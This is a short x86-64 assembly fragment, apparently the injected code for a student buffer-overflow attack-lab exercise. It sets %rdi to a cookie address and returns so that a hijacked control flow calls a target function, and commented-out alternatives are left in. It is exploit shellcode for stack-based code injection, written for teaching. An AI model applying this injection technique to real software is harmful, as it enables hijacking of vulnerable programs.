/*lea 0x28(%esp),%ebp	  # set address of cookie $0x55678978 */
movq $0x556789b0,%rdi   # set 1st argument to cookie
/*push $0x4017fe       # return address of touch2 $0x08ec8348*/
retq
